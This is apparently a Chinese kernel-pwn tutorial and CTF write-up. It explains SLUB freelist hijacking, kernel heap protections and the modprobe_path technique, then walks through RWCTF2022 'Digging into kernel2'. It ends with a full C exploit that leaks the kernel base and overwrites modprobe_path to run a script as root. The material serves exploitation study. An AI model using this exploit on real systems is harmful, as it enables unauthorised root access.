---
layout: post
title: 0x05. Linux kernel基础：劫持freelist
category: kernel pwn
date: 2024-8-1 15:00:00
---

这个我熟，tcache poisoning
<!-- more -->

[toc]

# Linux kernel之freelist劫持

## 0x00. 基础知识：slub分配器中的freelist

我们知道`Linux kernel`中的内存管理结构包括`buddy system`和`slub allocator`。而`slub allocator`也是由链表来进行管理的，包括正在使用的`kmem_cache_cpu`和`kmem_cache_node`。而释放掉的`obj`和我们用户态差不多，同样由头插法插入叫做`freelist`的链表。

该链表与`tcache`和`fastbin`的类似，遵循后进先出的形式（但需要注意的是`obj`不含有用户态`chunk`一样的`header`），并同样有一个指针指向`freelist`中下一个堆块。

因此，若我们打印该指针，可以得到`freelist`中下一个`obj`的地址；若我们劫持该指针指向任意位置，则可以将`obj`分配到任意位置，和用户态中的`tcache`十分类似。

注意，此处描述的是不开启堆保护机制的情况。

## 0x01. 基础知识：kernel中的堆保护

### Hardened freelist

我们知道`glibc`高版本中的`tcache`的`next`指针是有加密的，方法是将堆地址右移十二位再异或`next`指针。

在开启了`Hardened freelist`保护的内核中，`freelist`上的指针就和高版本的`glibc`类似。

`freelist`上的指针将由以下三个部分异或组成：

- 当前`free obj`的地址
- 下一个`free obj`的地址
- 由`kmem_cache`指定的`random`值

如你所见，在开启了这个保护的情况下，攻击者至少需要得知当前`free obj`的地址和`random`值才可以劫持`freelist`...

### Random freelist

在用户态下，分配`chunk`的过程是不断切割`top chunk`的过程，因此分配出的`chunk`都是在连续内存空间内的。

在开启了`random freelist`的`kernel`下，每个`freelist`中的`obj`不再位于连续的空间——而是在一个`slub allocator`中随机分布。如下所示：（图来自于`arttnba3`师傅）

![QQ_1722492400172](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202408011406468.png)

而这种保护实际上发生于`slub allocator`刚从`buddy system`拿到新`slub`的时候。由此，在之后，`freelist`仍然保持后进先出，这并不会给我们劫持`freelist`的`fd`造成实质影响。

### CONFIG_INIT_ON_ALLOC_DEFAULT_ON

很简单，开启该保护的时候，`kernel`的`buddy system`和`slab allocator`均会将分配出的`obj`上的内容清空，也就是防止未初始化的内存泄露~

###  Hardened Usercopy

简单来说就是会检测用户空间和内核空间相互进行数据拷贝的时候是否溢出，包括`copy_from_user`和`copy_to_user`等函数。

这种保护不适用于内核空间相互数据拷贝，因此可以从这个角度进行绕过~

## 0x02. 基础知识：modprobe_path

### 什么是modprobe_path

在`Linux`下，若我们执行一个非法文件（即`file magic not found`）时，内核会经历如下的调用链：

```c
entry_SYSCALL_64()
    sys_execve()
        do_execve()
            do_execveat_common()
                bprm_execve()
                    exec_binprm()
                        search_binary_handler()
                            __request_module() // wrapped as request_module
                                call_modprobe()
```

最终执行的是`call_modprobe()`，而`call_modprobe`如下所示：

```c
static int call_modprobe(char *module_name, int wait)
{
	//...
	argv[0] = modprobe_path;
	argv[1] = "-q";
	argv[2] = "--";
	argv[3] = module_name;	/* check free_modprobe_argv() */
	argv[4] = NULL;

	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
					 NULL, free_modprobe_argv, NULL);
	if (!info)
		goto free_module_name;

	return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
	//...
```

可以看到，其会以`root`权限来执行`modprobe_path`中的内容。

而`modprobe_path`中本身的内容是`/sbin/modprobe`。若我们能够将其劫持为一个恶意脚本路径（例如，里面写了`chmod 777 /flag`），则可以以`root`权限来执行这个恶意脚本。

显然，我们可以用`freelist`来劫持`modprobe_path`。

### kernel pwn中如何找到modprobe_path的地址

我们无法通过`cat /proc/kallsyms`来找到`modprobe_path`的地址。幸运的是，在`__request_module`中，存在一个对`modprobe_path`的引用。由此，我们可以从`/proc/kallsyms`中找到`__request_module`函数的地址，并使用`gdb`连接到`kernel`，查看该函数附近的汇编代码，即可找到`modprobe_path`的地址~

具体如下：

首先我们找到`__request_module`函数的地址：

![QQ_1722493258038](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202408011421877.png)

随后，我们让`gdb`连接到该`kernel`，设置`target remote:1234`即可，通过`x/40i`来查看刚刚获得的函数地址附近的代码：

![QQ_1722493343591](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202408011422018.png)

如上所示，箭头所指的地方就是`modprobe_path`的地址的引用。

通过如上方式，我们就可以获得`modprobe_path`的地址。

## 0x03. 初探freelist劫持：以RWCTF2022体验赛: Digging into kernel2为例

### 题目信息

题目启动脚本如下：

```bash
qemu-system-x86_64 \
	-kernel bzImage \
	-initrd rootfs.cpio \
	-append "console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr" \
	-cpu kvm64,+smep,+smap \
	-monitor null \
	--nographic \
    -s
```

可以看到：

- 开启了`smep`、`smap`保护，这意味着内核无法执行或者访问用户态的代码和数据；
- 开启了`kaslr`保护，这意味着内核基地址随机；
- 没有设置`oops=panic panic=1`，我们将其加上可以使得内核崩溃后退出。

题目`rcS`启动脚本(`/etc/init.d/rcS`)如下：

```c
#!/bin/sh

chown -R 0:0 /

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev

echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/kptr_restrict

insmod /xkmod.ko
chmod 644 /dev/xkmod

chmod 600 /flag
chmod 600 /etc/init.d/rcS

mkdir home && cd home
chown -R 1000:1000 .

echo "-------------------------------------------"
echo "|                                         |"
echo "| |~~\|  |  | /~~~~|~~|~~  /~\ /~~\/~\/|  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |  \ \/ \/  \__  |  |    /__ \__//___|_ |"
echo "|                                         |"
echo "-------------------------------------------"

poweroff -d 120 -f &
setsid cttyhack setuidgid 1000 sh
# setsid cttyhack setuidgid 0 sh

poweroff -d 0 -f
```

可以看到：

- 设置`dmesg_restrict`为`1`，这意味着普通用户不再能够通过`dmesg`查看`printk`输出
- 设置`kptr_restrict`为`1`，这意味着普通用户无法直接查看`/proc/kallsyms`获取函数地址
- 没有挂载`pts`，这意味着我们无法打开`/dev/ptmx`来打开`tty_struct`结构体

题目驱动的`file_operations`定义了`init`、`release`和`ioctl`，分别如下：

![QQ_1722494605845](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202408011443110.png)

可以看到，其创建了一个属于`kmalloc-192`的`kmem_cache`，名为`lalala`；

`ioctl`中有分配、编辑、查看堆块功能：

![QQ_1722494740302](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202408011445936.png)

可以看到，分配的`obj`保存在全局变量`buf`中。

而`release`中，可以释放`obj`，存在`UAF`:

![QQ_1722494815674](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202408011446730.png)

### 解题思路概览

这道题首先和`ciscn-2017-babydriver`类似：分配的`obj`由全局变量`buf`表示，这意味着我们可以通过打开多个题目驱动，来使得多个`fd`都指向这个全局变量。由于`UAF`的存在，我们可以关闭一个`fd`，而让其它的`fd`来编辑这个已经释放的堆块。

题目给定的`kmem_cache`为`kmalloc-192`，但没有任何分配`flag`：这就让我们的利用方式多样。而考虑到这里`kmalloc-192`不属于我们之前学到的`seq_file`和`pipe`的大小，而且本题也无法打开`tty_struct`，我们需要考虑使用别的方式来解出本题。

回到本题，本题给出了一个白给的`UAF`，并且含有编辑功能。在我们用户态下，我们便可以直接利用这点来打`__free_hook`：

这在内核中也类似，我们可以通过劫持`freelist`来实现任意地址写。

由此，我们先查看已经释放的`obj`的指针，观察其是否开启了`Hardened freelist`保护和`Random freelist`保护。经过测试，本题开启了`random freelist`，而没有开启`hardened freelist`。因此我们可以便捷地劫持`freelist`指针。

劫持到哪里呢？其实已经呼之欲出，将其指向`modprobe_path`，修改其内容为恶意脚本，即可修改`modprobe_path`来完成攻击~

### 解题思路重点 - 通过堆泄露内核基地址

在劫持`freelist`指向`modprobe_path`之前，我们需要思考如何泄露内核基地址。

师傅需要知道如下堆上的特性：

在堆地址`+ 0x9d000`处，存在一个地址：`secondary_startup_64`。因此，我们可以将`freelist`申请到这块`obj`，并泄露其中的内容，获取`secondary_startup_64`的地址，从而泄露内核基地址。

但由于`Random freelist`的存在，我们`UAF`的`obj`的地址是非常随机的，由此我们将其`& 0xfffffffff0000000`，猜测出其堆块基地址，若未命中，需要重新运行`exp`。

### 解题思路重点 - freelist合法性

在本题中，还需要注意保持`freelist`的合法性。

在用户态中，若我们让某条`tcache`链指向非法地址，则再次从该链中申请`chunk`时就会报错。

内核中也是如此，我们不能让`freelist`指向一个非法地址，即使是不再从里面申请也不行——因为很可能别的函数也会申请内存空间。因此，我们需要让`freelist`指针指向`0`。例如，在劫持`modprobe_path`的时候，我们可以指向其地址`-0x10`处：如此便可以让`freelist`中挂入的地址为`0`。

### 解题脚本

详细注释的`exp`脚本如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <stdarg.h>
#include "ltfallkernel.h"

#define SECONDARY_STARTUP_64 0Xffffffff81000030
#define MODPROBE_PATH 0xffffffff82444700

#define ROOT_SCRIPT_PATH "/home/shell.sh"

char root_cmd[] = "#!/bin/sh\nchmod 777 /flag\n";

typedef struct
{
    size_t *content;
    unsigned int offset;
    unsigned int size;
} book;

void note_read(int fd, book *b)
{

    ioctl(fd, 0x6666666, b);
}

void note_write(int fd, book *b)
{
    ioctl(fd, 0x7777777, b);
}

void note_add(int fd, book *b)
{
    ioctl(fd, 0x1111111, b);
}

int main()
{
    int dev_fd[5];
    int root_script_fd;
    size_t kernel_heap_leak;
    size_t page_offset_base;
    char flag[0x50];
    int flag_fd;

    bind_core(0);
    save_status();

    info("Starting to exploit...");

    // 打开五个fd
    for (int i = 0; i < 5; i++)
    {
        dev_fd[i] = open("/dev/xkmod", O_RDONLY);
        if (dev_fd[i] == -1)
        {
            err_exit("Failed to open /dev/xkmod.");
        }
    }

    /**
     * Step0: 创建fake modprobe_path
     */
    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT, 777);
    if (root_script_fd == -1)
    {
        err_exit("Failed to create root_script.");
    }
    write(root_script_fd, root_cmd, sizeof(root_cmd));
    close(root_script_fd);
    system("chmod +x " ROOT_SCRIPT_PATH);
    success("Finished writing root_script to " ROOT_SCRIPT_PATH);

    /**
     * Step1: 泄露内核基地址
     */

    // 申请一块内存备用
    // size_t *buf = (size_t*)malloc(0x1000 * sizeof(size_t));
    book data;
    data.content = malloc(0x1000);
    data.offset = 0;
    data.size = 0x50;

    // 申请一个obj，随后释放到freelist
    note_add(dev_fd[0], &data);
    note_read(dev_fd[0], &data);
    close(dev_fd[0]);

    // 程序里全局变量指针指向的空间已经被释放了，我们将其读出来读到buf
    note_write(dev_fd[1], &data);
    kernel_heap_leak = data.content[0];

    // 猜测堆地址
    page_offset_base = kernel_heap_leak & 0xfffffffff0000000;

    info("kernel_heap_leak is 0x%llx.", kernel_heap_leak);
    info("Guessing page_offet_base: 0x%llx.", page_offset_base);

    info("Since, try to alloc fake chunk at page_offset_base + 0x9d000 - 0x10 to leak kernel base...");

    // 这是因为freelist上得地址必须合法，我们将0x9d000-0x10的地方入freelist，它的next就会为0.合法
    data.content[0] = page_offset_base + 0x9d000 - 0x10;
    data.offset = 0;
    data.size = 8;

    // 劫持freelist的fd，申请两次
    note_read(dev_fd[1], &data);
    note_add(dev_fd[1], &data);
    note_add(dev_fd[1], &data);

    // 打印内容，查看是否获得secondary_startup_64函数的地址
    data.size = 0x40;
    note_write(dev_fd[1], &data);
    if ((data.content[2] & 0xfff) != (SECONDARY_STARTUP_64 & 0xfff))
    {
        error("Invalid data leak: 0x%llx.", data.content[2]);
        err_exit("Failed to HIT page_offset_base, try again!");
    }

    
    // 若获得，则可以通过该函数地址计算出内核基地址
    kernel_offset = data.content[2] - SECONDARY_STARTUP_64;
    kernel_base += kernel_offset;

    success("Kernel Offset: 0x%llx.", kernel_offset);
    success("Kernel Base: 0x%llx.", kernel_base);

    /**
     * Step1: 劫持modprobe_path
     */

    info("Making UAF again and hijacking modprobe_path...");

    // 由于刚刚让freelist中的obj指向0，因此再次add可以重新整一个slub page上来
    note_add(dev_fd[1], &data);
    close(dev_fd[1]);

    // 指向modprobe_path - 0x10，使得挂入freelist的地址合法
    data.content[0] = kernel_offset + MODPROBE_PATH - 0x10;
    data.offset = 0;
    data.size = 0x8;

    info("Hijacking freelist...");
    note_read(dev_fd[2], &data);
    note_add(dev_fd[2], &data);
    note_add(dev_fd[2], &data);

    // 往申请到的modprobe_path写我们的恶意脚本路径
    strcpy(&data.content[2], ROOT_SCRIPT_PATH);
    data.size = 0x30;
    note_read(dev_fd[2], &data);

    // 执行不合法的文件，触发call_modprobe
    info("Triggering fake modprobe_path...");
    system("echo -e '\\xff\\xff\\xff\\xff' > /home/fake");
    system("chmod +x /home/fake");
    system("/home/fake");

    memset(flag, 0, sizeof(flag));

    // 打开flag并读取，完结撒花
    flag_fd = open("/flag", O_RDWR);
    if (flag_fd < 0)
    {
        err_exit("Failed to chmod for flag!");
    }

    read(flag_fd, flag, sizeof(flag));
    
    success("Got flag: %s.", flag);

    return 0;
}
```

